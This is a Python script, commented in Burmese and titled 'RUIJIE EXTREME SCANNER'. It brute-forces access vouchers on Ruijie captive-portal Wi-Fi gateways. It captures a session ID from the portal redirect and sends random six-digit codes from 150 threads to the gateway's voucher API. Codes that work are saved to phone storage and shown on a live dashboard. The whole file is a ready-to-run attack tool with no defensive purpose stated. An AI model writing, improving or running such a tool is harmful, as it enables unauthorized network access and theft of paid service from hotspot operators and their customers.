import requests
import random
import string
import time
import os
import threading
import re
import sys
import urllib3
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors & Styling
bcyan = "\033[1;36m"
reset = "\033[00m"
white = "\033[0;37m"
bgreen = "\033[1;32m"
bred = "\033[1;31m"
yellow = "\033[0;33m"
magenta = "\033[1;35m"
dim = "\033[2m"

# ==============================
# CONFIG
# ==============================
NUM_THREADS = 150             
SESSION_POOL_SIZE = 50        
PER_SESSION_MAX = 500         
SAVE_PATH = "/storage/emulated/0/zapya/valid_codes.txt"

session_pool = Queue()
valid_codes = [] 
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_TRIED = 0
TOTAL_HITS = 0
CURRENT_CODE = "------"
START_TIME = time.time()
stop_event = threading.Event()

# ပထမ Script ထဲက Regex နည်းလမ်းကို အသုံးပြုပြီး SID ရှာဖွေခြင်း
def get_sid_from_gateway():
    global DETECTED_BASE_URL
    s = requests.Session()
    s.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    })
    test_url = "http://gstatic.com"
    try:
        # Gateway redirect ကို စစ်ဆေးခြင်း
        r1 = s.get(test_url, allow_redirects=True, timeout=5)
        final_url = str(r1.url)
        
        # ပထမ script ထဲက re.search နည်းလမ်းကို အစားထိုးထားသောနေရာ
        sid_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", final_url)
        
        if sid_match:
            sid = sid_match.group(1)
            parsed = urlparse(final_url)
            DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
            return sid
        else:
            # တကယ်လို့ URL မှာ တိုက်ရိုက်မပါရင် meta refresh/content ထဲမှာ ထပ်ရှာခြင်း
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            if path_match:
                new_url = urljoin(final_url, path_match.group(1))
                r2 = s.get(new_url, timeout=5)
                sid_match2 = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r2.url))
                if sid_match2:
                    parsed = urlparse(r2.url)
                    DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
                    return sid_match2.group(1)
        return None
    except:
        return None

def session_refiller():
    while not stop_event.is_set():
        if session_pool.qsize() < SESSION_POOL_SIZE:
            sid = get_sid_from_gateway()
            if sid: 
                session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
        time.sleep(2) # CPU သက်သာအောင် delay အနည်းငယ်ထားခြင်း

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    thr_session = requests.Session()
    headers = {
        'Content-Type': 'application/json', 
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    }
    while not stop_event.is_set():
        if not DETECTED_BASE_URL:
            time.sleep(1); continue
        try:
            slot = session_pool.get(timeout=1)
            sid = slot.get('sessionId')
            code = ''.join(random.choices(string.digits, k=6))
            CURRENT_CODE = code
            
            # API endpoint သို့ voucher စစ်ဆေးခြင်း
            r = thr_session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
                                 json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
                                 headers=headers, timeout=5)
            TOTAL_TRIED += 1
            
            if r.status_code == 200 and "true" in r.text.lower():
                with valid_lock:
                    if code not in valid_codes:
                        valid_codes.append(code)
                        TOTAL_HITS += 1
                        save_locally(code, sid)
            
            slot['left'] -= 1
            if slot['left'] > 0: 
                session_pool.put(slot)
        except Empty:
            continue
        except:
            pass

def save_locally(code, sid):
    ts = datetime.now().strftime("%H:%M:%S")
    try:
        os.makedirs(os.path.dirname(SAVE_PATH), exist_ok=True)
        with file_lock:
            with open(SAVE_PATH, "a") as f: 
                f.write(f"[{ts}] {code} (SID: {sid})\n")
    except: 
        pass

def live_dashboard():
    sys.stdout.write("\033[?25l") # Hide cursor
    while not stop_event.is_set():
        elapsed = time.time() - START_TIME
        speed = TOTAL_TRIED / elapsed if elapsed > 0 else 0
        
        output = f"\033[H" # Move cursor to top
        output += f"{bcyan}──────────────────────────────────────────────────────────────\n"
        output += f"{white}  RUIJIE EXTREME SCANNER {dim}v2.2{reset} | {magenta}Combined SID Extractor\n"
        output += f"{bcyan}──────────────────────────────────────────────────────────────\n"
        output += f"{white}  TARGET : {yellow}{DETECTED_BASE_URL or 'Searching...'}{reset}\n"
        output += f"{white}  STATS  : {bgreen}{TOTAL_HITS} Hits{white} | {speed:.1f} c/s | {TOTAL_TRIED:,} Total\n"
        output += f"{white}  ACTIVE : {bcyan}{CURRENT_CODE}{white} | Pool: {session_pool.qsize()}\n"
        output += f"{bcyan}──────────────────────────────────────────────────────────────\n"
        output += f"{bgreen}  RECENT HITS (TOP 10):\n"
        
        last_codes = valid_codes[-10:]
        if not last_codes:
            output += f"{dim}  [ ] Waiting for first hit...{reset}\n"
            for _ in range(9): output += "\n"
        else:
            for c in reversed(last_codes):
                output += f"{bgreen}  [✓] {c} {white}─ {dim}SAVED TO STORAGE{reset}\n"
            for _ in range(10 - len(last_codes)): output += "\n"
            
        output += f"{bcyan}──────────────────────────────────────────────────────────────\n"
        output += f"{dim}  Press CTRL+C to Exit Safely{reset}\n"
        
        sys.stdout.write(output)
        sys.stdout.flush()
        time.sleep(0.5)

if __name__ == "__main__":
    os.system('clear')
    try:
        # Session ရှာဖွေရေးကို အရင်စတင်သည်
        threading.Thread(target=session_refiller, daemon=True).start()
        threading.Thread(target=live_dashboard, daemon=True).start()
        
        # Worker threads များ စတင်သည်
        for _ in range(NUM_THREADS):
            threading.Thread(target=worker_thread, daemon=True).start()
            
        while True: 
            time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        sys.stdout.write("\033[?25h\n") # Show cursor back
        print(f"{yellow}[!] Stopped by user.{reset}")
